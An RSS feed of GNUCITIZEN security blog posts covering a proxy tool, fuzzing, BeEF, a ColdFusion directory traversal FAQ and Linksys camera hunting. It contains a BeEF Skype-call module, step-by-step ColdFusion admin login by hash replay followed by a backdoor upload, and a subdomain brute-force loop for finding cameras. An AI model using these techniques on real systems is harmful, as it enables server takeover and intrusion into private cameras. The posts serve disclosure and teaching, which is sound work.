<?xml version="1.0" encoding="utf-8" ?><rss version="2.0" xml:base="https://www.gnucitizen.org" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="https://www.gnucitizen.org/feed.xml" rel="self" type="application/rss+xml"></atom:link><title></title><description></description><link>https://www.gnucitizen.org/feed.xml</link><pubDate>Sat, 30 Jun 2018 09:49:53 GMT</pubDate><language>en</language><item><title>It has been a while</title><link>https://www.gnucitizen.org/blog/it-has-been-a-while/</link><pubDate>Sat, 30 Jun 2018 09:49:53 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/it-has-been-a-while/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
<p>GNUCITIZEN is 12 years old more or less. Can you believe it?</p>
<p>I am still trying to process the information and while it saddens me a little that we left the blogging scene for the past 8+ years I am proud with what we have achieved and the kind of legacy we have created. Even after so many successes and countless more failures, it is interesting to trace GC&#39;s impact on the security community over the years - from being first to try out different vulnerability disclosure practices to popping calc.exe from PDF documents or hacking hubs - it has more or less started here and took a life on its own.</p>
<p>It is almost surreal watching our old videos and even sometimes it is a bit embarrassing reading some of our old research, blog posts, and the good old comment flame wars. But this is normal. As you grow older and learn more you also become aware of your personal limitations. The naivety of the younger you are long gone and what is left is the hardened shell fortified by years of experience.</p>
<p>But, like any good story there is a sequel and while I cannot promise that will be better than the original what I am certain of is that it will be packed with this same hardened experience I talk about. It will be likely more measured, less flamboyant and to some extent conservative but it will also be insightful and perhaps a little naive. Naivety is important although it may come at some personal costs. To some extent, I believe the security community has forgotten its roots and what I am hoping to achieve with GC2 is to restore to balance in the universe.</p>
<p>So are you ready? I am not. But I am ready to dive deep!</p>

]]></description></item><item><title>Landing Proxify</title><link>https://www.gnucitizen.org/blog/landing-proxify/</link><pubDate>Wed, 06 Feb 2013 23:28:40 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/landing-proxify/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
<p>I am really happy to announce the first release of proxify. I started writing this tool several years ago but I was never able to finished it. The first release (version 1.0) is now available for <a href="http://code.google.com/p/gnucitizen/downloads/list">download</a> on all platforms: Linux, Mac and Windows.</p>
<h3 id="what-is-proxify">What is Proxify</h3>
<p>The idea behind Proxify is to create a proxy that is just good at doing proxying. It is the proxy of all proxies so-to-say. Proxify is lightweight, streamlined, concurrent and very efficient proxy utility that is easy to integrate into other tools. There is a good need for such tools because proxies are quite complex and not trivial to write even if you choose to use a high-level language such as Java, Python or Ruby.</p>
<p>This tool is written in C and comes with all dependencies pre-included in the package. This means that it is very portable on all platforms and you do not need any special setup. Having all files in the same folder is just enough to make it run.</p>
<p>Proxify is multithreaded and can in theory make optimal use of multi-cpu environments. The tool is non-buffering which means that it is really fast. It supports WebSockets, WebRTS and other streaming protocols. It fully understands HTTP. It does SSL interception and clones certificates on the fly.</p>
<h3 id="integration-at-its-core">Integration At Its Core</h3>
<p>As mentioned earlier, Proxify is great if you need to create a custom proxy application or you want to embed proxy functionalities into your own app. The tool will do all the hard work and you just need to provide a very simple restful HTTP service to do the forwarding of data between the browser and the remote target. The protocol is based on the HTTP proxy specifications with the only difference that you don&#39;t have to support the CONNECT method or do any SSL interception. Additionally, Proxify automatically detects end of streams when certain types of protocols are used. This makes the tool very handy, easy, re-usable technology that can be used in situations when we just want to write simple scripts to da a trivial job without to understand completely how the whole stack works. Everything is pretty much magically handled for you: and there is a lot going on behind the scene.</p>
<h3 id="other-usages">Other Usages</h3>
<p>Proxify can be used for many things. Here is an example of how you will launch the tool to hex dump all the trafic to the screen:</p>
<pre><code class="language-bash">./proxify -p 8080 -x</code></pre>
<p>The output of this command will look like this:</p>
<pre><code class="language-bash">xxxxxx:xxxxx pdp$ xxx/proxify -p 8080 -x
Proxify Version 1.0

Copyright 2013 GNUCITIZEN. All rights reserved.
Commercial use of this software is strictly prohibited.
For commercial options please contact us at http://www.gnucitizen.org/.

[0000]   47 45 54 20 2F 20 48 54   54 50 2F 31 2E 31 0D 0A   GET...HT TP.1.1..
[0000]   55 73 65 72 2D 41 67 65   6E 74 3A 20 63 75 72 6C   User.Age nt..curl
[bfc8]   2F 37 2E 32 37 2E 30 0D   0A 48 6F 73 74 3A 20 77   .7.27.0. .Host..w
[f4c9]   77 77 2E 67 6E 75 63 69   74 69 7A 65 6E 2E 6F 72   ww.gnuci tizen.or
[cea4]   67 0D 0A 41 63 63 65 70   74 3A 20 2A 2F 2A 0D 0A   g..Accep t.......
[609f]   50 72 6F 78 79 2D 43 6F   6E 6E 65 63 74 69 6F 6E   Proxy.Co nnection
[f2e5]   3A 20 4B 65 65 70 2D 41   6C 69 76 65 0D 0A 0D 0A   ..Keep.A live....</code></pre>
<p>If we want to dump all requests and responses into individual files than we can use the following command:</p>
<pre><code class="language-bash">./proxify -p 8080 -D /path/to/folder</code></pre>
<p>This will also capture everything that is streamed as well, which means that you can even record video, audio and whatever is streaming over HTTP. You can mix and match all options for bets result and please check the command flags for more information.</p>
<h3 id="tool-readiness">Tool Readiness</h3>
<p>Proxify is essentially ready for most use-cases although there are several things which needs to be improved especially around the SSL interception. Please use the tool with caution because it may have memory leaks or even memory corruption bugs. A huge portions of the code is not throughly tested. This is something I am working to improve in the near future. I am also planning to add more options for even better control over the process.</p>
<h3 id="fair-use">Fair Use</h3>
<p>The tool is free! You can use it right away. However, comercial use is strictly prohibited at this stage. If you want to use the tool for comercial purposes, please get in touch to discuss your options.</p>

]]></description></item><item><title>Fuzzing XML and JSON Pt.1</title><link>https://www.gnucitizen.org/blog/fuzzing-xml-and-json-pt-1/</link><pubDate>Thu, 13 Dec 2012 11:47:35 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/fuzzing-xml-and-json-pt-1/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
<blockquote>
<p>It is hard to get back to blogging especially when there are easier alternatives to scratch your itch - I am talking about <a href="http://twitter.com/pdp">twitter</a>. However, I decided to make the effort and see where it takes me. It will be difficult initially but practice leads to continuous improvement.</p>
</blockquote>
<p>What I would like to do is to highlight some of the work I did to take two relatively simple and straightforward penetration testing practices to the next level: this is XML and JSON fuzzing. If you have worked as a penetration tester or you have been moderately interested in web security you should have encountered a web service written on top of either of these technologies.</p>
<p>Both JSON and XML are slick beasts. They are both structured data containers and rely on well-formatted documents in order to be processed successfully. There is very little room for movement out of the spec and in fact they are both error intolerant. Most parsers will explode even on the tiniest errors in the document structure, such as for example if you leave a comma on the last item of an array inside a JSON structure. The reason I am mentioning this is because this is the basis of the two core fuzzing strategies - as I define them.</p>
<p>The first strategy is to concentrate on finding bugs in the actual parser/processor. In this case we will aim to submit ill-formatted documents and observe for strange behaviour. The types of problems typically discovered through this strategy are memory corruption bugs. The reason for this is because even in 2012 strings are still difficult to deal with and both formats are human-readable and rely heavily on processing text. Even binary input is represented textually.</p>
<p>The second strategy is to concentrate on finding bugs after the document has been parsed/processed. In this case we will aim to submit unexpected input but still stick to the format and the specifications of the document. This strategy is used to discover a lot wider range of bugs depending on how the structured data is used later on inside the application. The types of bugs discovered will depend on the targeted platform, language and all kinds of other things.</p>
<p>Both strategies can be mixed. However, from personal experience, I believe that you will be better off if you don&#39;t because things can get quite confusing and you may not be able to setup all necessary measurement equipment correctly in order to find actual bugs or extract any useful data.</p>
<p>The first strategy I tend to leave it in the realm of research. The reason for this is because there are not that many parsers for both JSON and XML. Each programming language usually offers a few libraries which are widely adopted. Fuzzing these libraries will get us bugs which apply to all applications that make use of them - i.e. research in my opinion. On the other hand, the second strategy is targeted towards specific applications and platforms. And this is what I will mainly concentrate on for the rest of this series of articles.</p>
<p>As I discussed earlier this &quot;second&quot;, so-to-say, strategy is all about sending unexpected input but still keeping the document well formatted. So what is unexpected input? Well unexpected input is everything from very large numbers to very small ones (MIN_INT, MAX_INT, UNSIGNED MAX_INT, LONG, etc). Unexpected input is also logical values such as true and false, the special atom nil, null and 0 and 1. Some other unexpected values could be empty data structures where a value is expected such as when sending empty array but the application expects a number or a string. The list goes on and on and you can spend weeks tuning a fuzzer to find more interesting stuff by incorporating more unexpected input.</p>
<p>It is fair to say that not all unexpected values are equal. Some values are more likely to cause strange behaviour than others and this all depends on the target platform. Let&#39;s take JSON for example. In JSON we have 2 main structured containers: <code>{}</code> - object and <code>[]</code> - array. Now, Java applications typically map/unmarshall JSON structures to classes. Therefore if we have a class which has public member variable <code>&quot;a&quot;</code> of type integer but we send an empty object, an exception will be raised before the input is even processed by the application. This is not quite like that in other programming languages which are not so strictly typed. For example, in PHP the developer may expect an integer but actually the parser will produce an array and while this will cause an error at some point later inside the application it will not immediately explode during parsing. This kind of conditions are very interesting.</p>
<p>So why I am mentioning this? Well, typically a fuzzer will generate a lot of combinations. Some of them may be fruitful. Most of them will be waste of time. However, by knowing what we are up against we can tune the fuzzer to be smarter and as a result of this a lot faster and more fruitful - I rather spend manually analysing 1000 results than 1000000.</p>
<p>I think I am running out of energy. After so many years of silence this post looks quite lengthy. Btw, such fuzzers exist. You can find one as part of the <a href="http://www.websecurify.com/suite">Websecurify Online Suite</a> and you can go ahead and try it for free now. Both <a href="https://suite.websecurify.com/market/jsonfuzz">JSON</a> and <a href="https://suite.websecurify.com/market/xmlfuzz">XML</a> are well supported. The reason I am mentioning this is because the rest of the series will concentrate on exploring how these fuzzers work and what kind of vulnerabilities we can find with them.</p>

]]></description></item><item><title>You and Your Research</title><link>https://www.gnucitizen.org/blog/you-and-your-research/</link><pubDate>Wed, 05 Dec 2012 00:40:04 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/you-and-your-research/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
<p>This is really one of my favourite talks from this year&#39;s HITB in KL.</p>
<iframe class="video" src="//www.youtube.com/embed/JoVx_-bM8Tg" frameborder="0" allowfullscreen></iframe>

<p><a href="https://twitter.com/haroonmeer">@haroonmeer</a> did an exceptional job at describing what it takes to produce an exceptional piece of work/research and the various pitfalls and sacrifices one needs to make.</p>

]]></description></item><item><title>Well Websecurify Runs on The iPhone</title><link>https://www.gnucitizen.org/blog/well-websecurify-runs-on-the-iphone/</link><pubDate>Thu, 04 Aug 2011 16:27:04 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/well-websecurify-runs-on-the-iphone/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
<p>This is not necessarily news anymore since it was <a href="http://blog.websecurify.com/2011/08/websecurify-for-iphone-preview.html">discussed</a> on the Websecurify official blog but we are so excited about it that we could not hold ourselves from posting it here too.</p>
<iframe class="video" src="//www.youtube.com/embed/19U37T7F8Lw" frameborder="0" allowfullscreen></iframe>

<p>The testing engine used in this particular version of Websecurify is optimized to run with the least possible amount of memory. The results of the scanner are as good as those produced by all other Websecurify variants although in some cases it may miss some statistically unlikely types of issues. This is not directly and only applicable to the iPhone version. No! Similar tradeoffs are also present even in standard desktop/server based scanners although they are usually less visible and obscured behind tones of options. The bottom line is that the scanner not only runs natively on the iOS but also works as expected.</p>
<blockquote>
<p>Now this is exciting! Websecurify is the first in the world mobile web application testing technology.</p>
</blockquote>
<p>If you have any suggestions, recommendations or general feedback please do let us know. You can also <a href="https://spreadsheets.google.com/spreadsheet/viewform?formkey=dEFlRENtdnJKSTJaeC13TjhHaVduckE6MQ">participate</a> in the beta test program which will allow you to have a play with tool as we are polishing it for the official release.</p>
<p><em>The possibilities are endless.</em></p>

]]></description></item><item><title>Stuxnet</title><link>https://www.gnucitizen.org/blog/stuxnet/</link><pubDate>Mon, 13 Jun 2011 15:21:37 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/stuxnet/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
<p>I have been avoiding the topic about Stuxnet for quite some time, mainly because there were many others who spent the time to take the virus apart. However, here is a video, which I find rather amusing:</p>
<iframe class="video" src="//www.youtube.com/embed/7g0pi4J8auQ" frameborder="0" allowfullscreen></iframe>

<p>Wether this is the real deal or simply fear mongering, I simply don&#39;t know. It is all speculations at the moment. The only thing we can say is that it is difficult to deny the fact that computers are important and whoever has control over them has control over people lives and can influence a lot of things including politics.</p>

]]></description></item><item><title>Having Fun With BeEF, The Browser Exploitation Framework</title><link>https://www.gnucitizen.org/blog/having-fun-with-beef-the-browser-exploitation-framework/</link><pubDate>Tue, 22 Feb 2011 11:40:26 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/having-fun-with-beef-the-browser-exploitation-framework/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
<blockquote>
<p>We haven&#39;t featured any guest bloggers in a while, but we&#39;re glad to be featuring <a href="http://un-excogitate.org/">Chirstian Frichot</a> this month! Christian is a security professional based in Perth, Western Australia. He&#39;s currently working in the finance industry as part of a tight-knit internal team of security consultants doing their best to protect their business and customers from technical threats such as malware or insecure web applications.</p>
</blockquote>
<blockquote>
<p>After having met <a href="http://www.bindshell.net/users/Wade">Wade Alcorn</a> (the initial author and project lead of BeEF), Christian mentioned his interest in helping out on the project where he could, which eventually led to Wade accepting his offer. The discussion was held over a couple of bottles of wine, so perhaps Wade&#39;s regretting the decision now!</p>
</blockquote>
<blockquote>
<p>Christian&#39;s role within the BeEF project, if it were to be defined, is odd-jobs-go-to-boy, command-module implementer, Ext-JS-fighter and twitter maintainer. When Christian is not working on BeEF, he&#39;s doing his best to represent the Perth OWASP Chapter, or laying down crunchy beats on the drum-kit.</p>
</blockquote>
<blockquote>
<p>What follows are Chritian&#39;s words on the BeEF project.</p>
</blockquote>
<p>Sorry vegetarians, but BeEF is back. That&#39;s right, the Browser Exploitation Framework is back, and it has now been rewritten from the ground up in Ruby. For those unfortunate people who haven&#39;t had a chance to explore the older, PHP version of BeEF you&#39;re only missing out on one of the greatest, most extensible XSS-payload management and exploitation frameworks out there, and the Ruby re-write is no different.</p>
<p>The Browser Exploitation Framework (BeEF) is a powerful, professional security tool. BeEF is pioneering techniques that provide the experienced penetration tester with practical client side attack vectors. Unlike other security frameworks, BeEF focuses on leveraging browser vulnerabilities to assess the security posture of a target.</p>
<p>One of the newer modules implemented in BeEF utilises the insecure handling of URL schemes in Apple&#39;s iOS to trick Skype into starting an outbound call. This vulnerability was first written about by <a href="http://www.dhanjani.com/blog/2010/11/insecure-handling-of-url-schemes-in-apples-ios.html">Nitesh Dhanjani</a> and highlights that with the growing popularity of these devices these sorts of issues may lead to losses of information or other negative impacting events. The module itself is as simple as:</p>
<pre><code class="language-javascript">beef.execute(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
    <span class="built_in">document</span>.body.innerHTML = <span class="string">"&lt;iframe src=skype:&lt;%= @tel_num %&gt;?call&gt;&lt;/iframe&gt;"</span>;
    beef.net.sendback(<span class="string">"&lt;%= @command_url %&gt;"</span>, &lt;%= @command_id %&gt;, <span class="string">"result=IFrame Created!"</span>);
});</code></pre>
<p>which, once added to a particular hooked browsers command queue will simply execute upon next poll, and if they automatically authenticate to the Skype application, will initiate a call. Due to iOS&#39; multi-tasking the Skype app does pop up to the top, so the end user is aware that the activity is occurring, but they&#39;re not prompted to &quot;confirm&quot; the action. You can see this module demonstrated bellow:</p>
<iframe class="video" src="//www.youtube.com/embed/5SVu6VdLWgs" frameborder="0" allowfullscreen></iframe>

<p>The current release is 0.4.2.1-alpha, but by release 0.5 (the Sirloin Release) we&#39;re expecting to have at least all of the PHP BeEF functionality provided plus much more, including:</p>
<ol>
<li>jQuery included as part of the hooking process</li>
<li>Metasploit integration</li>
<li>Evercookie&#39;s for persistence even after a hooked browser has been closed</li>
<li>Full event logging, not just keystroke logging, to include window activation/deactivation, mouse clicks, etc</li>
<li>Arbitrary HTTP requester</li>
<li>Proxying</li>
<li>Persistence modules (subtle popups or 100%x100% iframes)</li>
<li>Detecting of social networking authentication status (as per <a href="http://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">this</a>)</li>
</ol>
<p>You can find out more about beef over at <a href="http://beef.googlecode.com">http://beef.googlecode.com</a> or
by following the <a href="http://twitter.com/beefproject">@beefproject</a>.</p>
<p><em>BeEF - Get it into ya!</em></p>

]]></description></item><item><title>ColdFusion directory traversal FAQ (CVE-2010-2861)</title><link>https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</link><pubDate>Fri, 13 Aug 2010 15:31:33 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</guid><media:content url="https://www.gnucitizen.org/files/2010/08/cf_dir_traversal_exploited-270x150.png &quot;CF Dir Traversal Exploited PNG&quot;"></media:content><dc:creator>pagvac</dc:creator><description><![CDATA[
<p>A new Adobe <a href="http://www.adobe.com/support/security/bulletins/apsb10-18.html">hotfix</a> for ColdFusion has been released recently. The vulnerability which was discovered by Richard Brain, was rated as <a href="http://www.adobe.com/devnet/security/security_zone/severity_ratings.html">important</a> by Adobe and could affect a large number of Internet-facing web servers. The FAQ bellow is meant to shed some light on this vulnerability so that ColdFusion administrators can understand what they&#39;re up against.</p>
<h3 id="the-faq">The FAQ</h3>
<p>Finally, by producing this FAQ I will attempt to explain why (at least on certain setups) this vulnerability should have been granted a <strong>CRITICAL</strong> rating by Adobe, rather than Important. As we&#39;ll see bellow, it is possible to fully compromise the underlying OS of a vulnerable ColdFusion server by exploiting this directory traversal vulnerability.</p>
<h4 id="how-does-the-vulnerability-work-">How does the vulnerability work?</h4>
<p>The vulnerability is a variation of a classic directory traversal vulnerability, also referred to as arbitrary file retrieval. The attack involves tricking a server-side script to provide the contents of a file that it was not originally supposed to be made available. By moving up a few directory levels, the attacker is able to obtain the contents of files outside the application server&#39;s webroot via special strings such as <code>../</code>. More information can be found on the <a href="http://www.owasp.org/index.php/Path_Traversal">OWASP</a> website.</p>
<h4 id="is-authentication-required-to-exploit-this-vulnerability-">Is authentication required to exploit this vulnerability?</h4>
<p>NO. The attacker doesn&#39;t require knowledge of any passwords in order to exploit the directory traversal bug.</p>
<h4 id="what-s-the-goal-of-the-attacker-when-exploiting-this-vulnerability-">What&#39;s the goal of the attacker when exploiting this vulnerability?</h4>
<p>Just as any other type of directory traversal vulnerability, the attacker would usually attempt to obtain source code of the target site in order to identify security vulneraibilities. Additionally, the attacker would most likely attempt to obtain configuration files containing sensitive information. For instance, in the case of ColdFusion the attacker would most likely attempt to read the contents of <code>neo-security.xml</code> and <code>password.properties</code>. These configuration files contain database connection credentials and the ColdFusion administrator password respectively. Depending on how <code>password.properties</code> has been setup, the ColdFusion admin password will be hashed or stored in clear-text (<code>encrypted=false</code>).</p>
<h4 id="what-s-the-worst-that-could-happen-once-this-vulnerability-has-been-exploited-successfully-">What&#39;s the worst that could happen once this vulnerability has been exploited successfully?</h4>
<p>As we&#39;ll see at the end of this post, once the attacker has gained access to the CF admin console - e.g.: by cracking the admin password - it might be possible to fully compromise the underlying OS.</p>
<h4 id="how-can-the-vulnerability-be-resolved-">How can the vulnerability be resolved?</h4>
<p>You can either apply Adobe&#39;s <a href="http://kb2.adobe.com/cps/857/cpsid_85766.html">patch</a> or restrict access to the following directories and file from trusted IP addresses only: <code>/CFIDE/adminapi/ /CFIDE/administrator/ /CFIDE/componentutils/ /CFIDE/wizards/ /CFIDE/install.cfm</code></p>
<h4 id="what-are-the-mitigating-factors-">What are the mitigating factors?</h4>
<p>This vulnerability cannot be exploited on ColdFusion 9.X when default settings are used, unless of course you figure out a way to get around the directory traversal signatures used by the filtering routines. Additionally, the ColdFusion administrator login console must be available to the attacker. It is however quite common to find CF admin consoles directly available on the Internet.</p>
<p><del datetime="2010-08-16T22:36:05+00:00">If a long and sufficiently random admin password is used, cracking the SHA1 hash could prove to be difficult. This is applicable to CF MX7, 8 and 9</del> (<strong>see UPDATE notes</strong>). Version 6 doesn&#39;t hash the password, but instead encrypts it using a proprietary algorithm.</p>
<h4 id="what-versions-of-coldfusion-are-affected-">What versions of ColdFusion are affected?</h4>
<p>According to the Adobe <a href="http://www.adobe.com/support/security/bulletins/apsb10-18.html">bulletin</a> the affected versions are &quot;ColdFusion 8.0, 8.0.1, 9.0, 9.0.1 and earlier versions for Windows, Macintosh and UNIX&quot;. However, due to time constraints I have only personally confirmed the vulnerability on version 8.0.1 under Windows.</p>
<h4 id="can-you-provide-the-actual-exploit-">Can you provide the actual exploit?</h4>
<p>No. ProCheckUp will provide the exploit details at a later date. Although Richard Brain privately shared POC URLs with me, I will not make them available. Exploit details were only provided to me as a trusted security analyst for purpose of assessing the impact of the vulnerability and help me write this FAQ in the hope that it will benefit the community.</p>
<p><strong>UPDATE:</strong> the <a href="http://www.exploit-db.com/exploits/14641/">exploit details</a> were published by an anonymous researcher on <em>14/08/2010_, probably worked out by reverse-engineering Adobe&#39;s patches. ProCheckUp has also released the <a href="http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07">exploit details</a> as of _17/08/2010</em>.</p>
<h4 id="can-you-describe-a-real-attack-scenario-">Can you describe a real attack scenario?</h4>
<p>The following a real attack scenario against ColdFusion 8 on a Windows server:</p>
<ol>
<li>Attacker confirms ColdFusion admin console is Internet facing. E.g. <code>http://target-domain.foo/CFIDE/administrator/index.cfm</code></li>
<li>Attacker exploits directory traversal vulnerability and obtains the contents of <code>C:\ColdFusion8\lib\password.properties</code>, which contains the ColdFusion admin password <div class="screen"><a href="/files/2010/08/cf_dir_traversal_exploited.png"><img src="/files/2010/08/cf_dir_traversal_exploited-270x150.png" alt="" title="CF Dir Traversal Exploited PNG"></a></div></li>
<li>If the admin password was stored encrypted (actually CF8 hashes the admin password using the SHA1 algorithm, similar to CF MX7), the attacker then attempts to crack it via an offline password cracking attack or <a href="http://passcracking.com/">rainbow table</a> <a href="http://hashcrack.com/">lookup</a>. Note that the default setting in ColdFusion 8 is <code>encrypted=true</code> as per <code>password.properties</code> file. Otherwise, if the password is stored unencrypted (<code>encrypted=false</code>), there would be no need for password cracking.</li>
<li><strong>UPDATE:</strong> as suggested by <a href="http://blog.teusink.net/">Niels Teusink</a>, an attacker could login as the CF administrator without needing to crack the SHA1 hash. I verified his observation and can confirm it works well. You can follow these steps (tested on Firefox 3.6.8) to login using the SHA1 hash. i.e.: no need to crack the password hash:<pre><code>1.  Configure your favorite MITM proxy - e.g. [Burp](http://portswigger.net/proxy/) - to capture traffic between your browser and target CF admin console</code></pre><ol start="2">
<li>Enter hash in password field of login form (usually located on <code>/CFIDE/administrator/enter.cfm</code>)</li>
<li>Type the following on your browser&#39;s address bar and press enter (make sure JavaScript is enabled on your browser): <code>javascript:hex_hmac_sha1(document.loginform.salt.value,document.loginform.cfadminPassword.value)</code></li>
<li>Record value. e.g. <code>AFA9C9D917916DE6CE05C1BFEC0470E07A246CB0</code></li>
<li>Press browser&#39;s Back button</li>
<li>Press Login on the login form (trapping/intercept mode should be enabled on your MITM proxy at this point)</li>
<li>Trap the login request and replace the value of the <code>cfadminPassword</code> parameter with the value recorded above</li>
<li>Forward request</li>
</ol>
</li>
<li>At this point, the attacker would be able to login as a CF admin and upload a <a href="http://michaeldaw.org/projects/web-backdoor-compilation">malicious CFM script</a> that would allow him to run remote commands (SYSTEM privileges by default). Uploading files to a CF server via the administrator console is a bit counter-intuitive. The attacker would basically add a scheduled task that would download cfexec.cfm to the server&#39;s webroot <div class="screen"><a href="/files/2010/08/backdoor_task.png"><img src="/files/2010/08/backdoor_task-170x150.png" alt="" title="CF Backdoor Task PNG"></a></div></li>
<li>At this point, the attacker has gained full control of the underlying Windows OS as the CF service runs with SYSTEM privileges by default <div class="screen"><a href="/files/2010/08/command_execution2.png"><img src="/files/2010/08/command_execution2-362x150.png" alt="" title="CF Command Execution PNG"></a> <a href="/files/2010/08/command_output.png"><img src="/files/2010/08/command_output-300x90.png" alt="" title="CF Command Output PNG"></a></div></a></li>
</ol>
<p>If the CF admin password is hashed and the attacker is unable to crack it, he could always try to obtain the database connection credentials (<code>C:\ColdFusion8\lib\neo-datasource.xml</code>) which can be <a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html">easily decrypted</a> and then directly authenticate to the backend DB server. This however wouldn&#39;t normally be possible on a firewalled environment where the back-end DB server is not directly exposed to the Internet. Network access controls are your friends!</p>
<h3 id="post-updates">Post Updates</h3>
<ul>
<li><strong>16/09/2010</strong> - new path added as part of blacklisting solution</li>
<li><strong>16/09/2010</strong> - added trick to login without cracking the CF admin password hash</li>
<li><strong>16/09/2010</strong> - mentioned recently published exploit code for the CF traversal vulnerability</li>
<li><strong>18/09/2010</strong> - fixed typos and mentioned release of exploit details by ProCheckUp</li>
</ul>

]]></description></item><item><title>1ST European Edition of HITB Coming Up!</title><link>https://www.gnucitizen.org/blog/1st-european-edition-of-hitb-coming-up/</link><pubDate>Thu, 24 Jun 2010 09:16:22 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/1st-european-edition-of-hitb-coming-up/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
<p>In case you haven&#39;t heard yet, HITBSecConf is hosting the first European Edition of their <a href="http://conference.hackinthebox.org/hitbsecconf2010ams/?page_id=24">conference</a> in Amsterdam during 1st-2nd July &#39;10. The history of the HITB conferences can be traced back to 2002, the year in which the first ever edition of HITB took place in Malaysia. Since then, HITB has grown to become the biggest technical computer security event in Asia and has extended their presence to the Middle East and now Europe.</p>
<blockquote>
<p>HITB aims to congregate members of the security community from all circles. From academics, and well known infosec personalities to loner-type independent researchers, and hobbyists just to name a few. I&#39;ve personally attended past editions in Kuala Lumpur and Dubai and loved that the attendees and speakers came from a wide variety of backgrounds. If you don&#39;t believe me, check out the <a href="http://photos.hackinthebox.org/gallery/">pix</a> of past conferences and you&#39;ll find sec nerds and corporate professionals all partying in unison. Indeed, the HITB conferences are not only educational, but among the most fun sec events I&#39;ve had the chance to attend.</p>
</blockquote>
<p>Registration is still open, so you are still on time to take advantage of a great speaker lineup and one of the <em>de facto</em> party capitals of Europe. The conference agenda can be found <a href="http://conference.hitb.org/hitbsecconf2010ams/agenda.pdf">here</a>.  I&#39;m really looking forward to Niels Teusink&#39;s <a href="http://blog.teusink.net/2010/05/presenting-at-hack-in-box-2010.html">presentation</a> on hacking Logitech wireless presenters and the release of detailed examples of JIT-spray techniques against IE8, FF3.6 by <a href="http://dsecrg.com/">Alexey Sintsov</a> (originally <a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf">discussed</a> by Dion Blazakis).</p>
<p>One more thing, almost forgot: there will be a bring-your-own-laptop <a href="http://conference.hitb.org/hitbsecconf2010ams/?page_id=41">web hacking challenge</a> at HITB EU.</p>
<p><em>See you at HITB Amsterdam next month!</em></p>

]]></description></item><item><title>Hacking Linksys IP Cameras (pt 6)</title><link>https://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-6/</link><pubDate>Wed, 24 Feb 2010 07:18:29 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-6/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
<blockquote>
<p>This article is a continuation of the following GNUCITIZEN articles: <a href="/blog/hacking-linksys-ip-cameras-pt-1/">here</a>, <a href="/blog/hacking-linksys-ip-cameras-pt-2/">here</a>, <a href="/blog/hacking-linksys-ip-cameras-pt-3/">here</a>, <a href="/blog/hacking-linksys-ip-cameras-pt-4/">here</a> and <a href="/blog/hacking-linksys-ip-cameras-pt-5/">here</a>.</p>
</blockquote>
<p>As we know, there are several ways one could go about hunting for IP cameras on the net. The slowest way would be to portscan random IP addresses for certain ports and programmatically detect if the web interface of a given camera was available on the open ports found. This method definitely works, but it can be very time consuming as it consists of scanning random IP addresses hoping that we&#39;ll eventually come across the type of device we&#39;re interested in.</p>
<p>The second method, which would be much faster in finding our target devices, would be to use a <a href="http://www.google.co.uk/search?ie=UTF-8&amp;q=inurl:/img/vr.htm">search engine</a> and query content that is unique to our target devices (e.g.: URLs, HTML title). This method, popularized by <a href="http://www.hackersforcharity.org/ghdb/?function=summary&amp;cat=18">GHDB</a> is simple and effective. The only issue I find with this strategy is that many of these IP cameras found happen to respond very slowly. This is probably due to other curious individuals running the same searches and accessing the same cameras.</p>
<p>The third method which would allow you to find more hidden Linksys IP cameras (i.e.: not cached by search engines a.k.a. the <a href="http://www.ericdigests.org/2002-2/hidden.htm">hidden web</a>), would consist of bruteforcing subdomains within dynamic domain names (DDNS) used by our target devices (Linksys IP cameras in this case). For instance, the following are some of the dynamic domain names supported by the WVC54GCA and WVC80N Linksys IP camera models:</p>
<ul>
<li><code>linksys-cam.com</code></li>
<li><code>mylinksyscamera.com</code></li>
<li><code>mylinksyshome.com</code></li>
<li><code>mylinksyscam.com</code></li>
<li><code>mylinksysview.com</code></li>
<li><code>linksysremotecam.com</code></li>
<li><code>linksysremoteview.com</code></li>
<li><code>linksyshomemonitor.com</code></li>
</ul>
<h3 id="camera-discovery-process-through-subdomain-bruteforcing">Camera discovery process through subdomain bruteforcing</h3>
<p>We first save the aforementioned domains in a file, <code>doms</code> in this case. Then we use <a href="http://code.google.com/p/dnsmap/">dnsmap</a> to bruteforce subdomains for each of the domains included in <code>doms</code>.</p>
<p>Using dnsmap&#39;s built-in wordlist:</p>
<pre><code>$ for i in `cat doms`;do dnsmap $i -r ~/ -i 64.14.13.199,216.39.81.84&amp;done;</code></pre><p>Using a user-supplied wordlist, <code>wordlist_TLAs.txt</code> in this case, which is a three-letter acronym wordlist included with dnsmap v0.30:</p>
